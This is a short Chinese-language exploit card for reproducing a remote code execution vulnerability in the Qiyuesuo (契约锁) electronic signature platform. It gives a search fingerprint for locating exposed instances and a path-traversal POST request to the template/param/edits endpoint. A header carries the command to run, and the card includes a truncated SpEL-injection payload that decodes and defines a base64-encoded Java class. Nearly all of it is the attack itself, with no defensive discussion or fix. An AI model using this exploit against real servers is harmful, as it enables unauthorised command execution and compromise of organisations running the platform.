# 契约锁电子签章平台paramedits远程代码执行漏洞复现

- **系统**：契约锁电子签章平台paramedits远程　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="契约锁-电子签署平台"`
- **请求**：`POST /contract/ukeysign/.%2e/.%2e/template/param/edits HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`X-State: id`

**请求体 / payload**
```
{"id":"2","params":[{"expression":"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VCAob3JnLnNwcmluZ2ZyYW1ld29yay5jZ2xpYi5jb3JlLlJlZmxlY3RVdGlscykuZGVmaW5lQ2xhc3MoIlF5c1Rlc3QiLFQgKG9yZy5zcHJpbmdmcmFtZXdvcmsudXRpbC5CYXNlNjRVdGlscykuIGRlY29kZUZyb21TdHJpbmcoInl2NjZ2Z0FBQURJQktBb0FJUUNXQ0FDWENnQ1lBSmtLQUpnQW1nb0Ftd0NjQ0FDZENnQ2JBSjRIQUo4SUFLQUlBS0VJQUtJSUFLTUtBQjhBcEFvQXBRQ21DQUNuQ2dDWUFLZ0tBS1VBcVFjQWd3b0FtQUNxQ0FDckNnQXNBS3dLQUNFQXJRb0FId0NxQ0FDdUNnQWZBSzhLQUxBQXFnZ0FzUW9BTEFDeUNBQ3pDQUMwQndDMUNnQWZBTFlIQUxjS0FMZ0F1UWdBdWdjQXV3Z0F2QWdBdlFjQXZnb0FKd0MvQ2dBbkFN…（脚本共 9778 字，完整版见原文）
```
- **预期**：200　|　—